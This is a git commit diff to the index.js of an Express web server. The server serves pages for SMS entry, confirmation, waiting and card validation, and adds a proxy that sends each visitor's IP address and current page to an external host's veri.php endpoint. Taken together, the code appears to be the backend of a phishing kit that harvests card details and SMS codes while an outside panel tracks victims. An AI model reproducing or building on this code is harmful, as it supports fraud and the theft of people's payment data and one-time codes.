67d4f38be0c244f6def35e6ddfd578a47af1e791
Aligollez <ikametonay@gmail.com>
2024-07-09 00:56:53 +0300

    33

--- index.js
+++ index.js
@@ -9,15 +9,16 @@ const { readdirSync } = require("fs");
 app.use(express.json());
 app.use(express.static('public'));
 
+// Import routes from the routes directory
 readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));
 
+// Define static file routes
 app.get('/files/css', (req, res) => {
   res.sendFile(__dirname + '/public/files/css');
 });
 app.get('/bk.gif', (req, res) => {
   res.sendFile(__dirname + '/public/bk.gif');
 });
-
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
@@ -27,7 +28,6 @@ app.get('/files/bootstrap.min.css', (req, res) => {
 app.get('/files/logo-2.png', (req, res) => {
   res.sendFile(__dirname + '/public/files/logo-2.png');
 });
-
 app.get('/bilgi.html', (req, res) => {
   res.sendFile(__dirname + '/public/bilgi.html');
 });
@@ -37,30 +37,23 @@ app.get('/onay', (req, res) => {
 app.get('/files/font-awesome.min.css', (req, res) => {
   res.sendFile(__dirname + '/public/files/font-awesome.min.css');
 });
-app.get('onay.png', (req, res) => {
+app.get('/onay.png', (req, res) => {
   res.sendFile(__dirname + '/public/onay.png');
 });
 app.get('/files/flaticon.css', (req, res) => {
   res.sendFile(__dirname + '/public/files/flaticon.css');
 });
-
 app.get('/sms.html', (req, res) => {
   res.sendFile(__dirname + '/public/sms.html');
 });
-app.get('/bekle.html', (req, res) => {
+app.get('/bekle', (req, res) => {
   res.sendFile(__dirname + '/public/bekle.html');
 });
-
 app.get('/files/js', (req, res) => {
   res.sendFile(__dirname + '/public/files/js');
 });
-
- 
 app.get('/img/bg-image.jpeg', (req, res) => {
   res.sendFile(__dirname + '/public/img/bg-image.jpeg');
-});
-app.get('/img/bg-image.jpeg', (req, res) => {
-  res.sendFile(__dirname + '/public/files/logo-2.png');
 });
 app.get('/files/jquery.creditCardValidator.js.indir', (req, res) => {
   res.sendFile(__dirname + '/public/files/jquery.creditCardValidator.js.indir');
@@ -78,15 +71,16 @@ app.get('/files/style.css', (req, res) => {
   res.sendFile(__dirname + '/public/files/style.css');
 });
 
-
+// Proxy endpoint to handle external API requests
 app.get('/api', async (req, res) => {
   try {
     const userIp = req.query.ip;
+    const currentPage = req.query.current_page;
 
-    // URL'yi oluştur
-    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}`;
+    // Construct the external API URL
+    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;
 
-    // Fetch kullanarak GET isteği yap
+    // Make a GET request to the external API
     const response = await axios.get(apiUrl);
 
     if (!response.data) {
@@ -97,10 +91,11 @@ app.get('/api', async (req, res) => {
   } catch (error) {
     console.error('Hata:', error);
 
-    // Hata mesajını istemciye gönder
+    // Send the error message to the client
     res.status(500).json({ error: error.message });
   }
 });
+
 app.listen(port, () => {
   console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
 });
